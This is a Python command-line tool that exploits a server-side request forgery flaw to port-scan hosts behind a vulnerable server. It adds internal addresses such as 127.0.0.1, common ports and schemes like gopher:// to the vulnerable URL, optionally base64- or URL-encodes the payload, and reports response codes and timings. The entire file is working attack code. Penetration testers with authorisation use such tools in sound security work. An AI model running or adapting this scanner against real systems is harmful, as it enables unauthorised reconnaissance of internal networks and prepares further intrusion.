#!/usr/bin/python3
#ssrf portscan

import sys
import argparse
import requests
import signal
import urllib3
import os
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="ssrf portscan")
parser.add_argument("-s", dest="ssrfurl", required=True, help="SSRF Url")
parser.add_argument("-c", dest="scheme", required=False, help="Define scheme, such as http://, netdoc:///, gopher://, defaults to https://", default="https://")
parser.add_argument("-t", dest="target", required=False, help="Target to scan, such as 127.0.0.1", default="127.0.0.1")
parser.add_argument("-p", dest="ports", required=False, help="Comma seperated ports to scan", default="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080")
parser.add_argument("-u", dest="path", required=False, help="Path to request, defaults to /favicon.ico", default="/favicon.ico")
parser.add_argument("-e", dest="enc", required=False, help="Encode payload (choose b64 or url)", default="")
parser.add_argument("-b", dest="prox", required=False, help="Proxy through burp", action="store_true")

args = parser.parse_args()
port1 = args.ports
path = args.path
ssrfurl = args.ssrfurl
ports = port1.split(",")
target = args.target
enc = args.enc
scheme = args.scheme
prox = args.prox
col = ":"

def handler(signum, frame):
    res = input(" Ctrl-c was pressed. Do you really want to exit? y/n ")
    if res == 'y':
        exit(1)
signal.signal(signal.SIGINT, handler)
if prox == True:
    proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }
else:
    proxies = ""
print("[*] ssrf port scanner")
for port in ports:
    target2 = scheme+target+col+port+path
#encoding
    if enc == 'b64':
        b = base64.b64encode(bytes(target2, 'utf-8'))
        urlscan = ssrfurl + b.decode('utf-8')
    elif enc == 'url':
        urlscan = ssrfurl + requests.utils.quote(target2)
    else:
        urlscan = ssrfurl+target2
#main requests function
    try:
        r = requests.get(urlscan, verify=False, timeout=7, allow_redirects=False, proxies=proxies)
        restime = str(r.elapsed.total_seconds())
        print("[-] Response from ("+target+":"+port+")  "+str(r.status_code)+" / "+restime+" ")
        if r.text and r.status_code == 200:
            print("[#] "+urlscan)
    except requests.exceptions.Timeout:
       print("[!] Response from ("+target+":"+port+") Response Timeout")
       continue

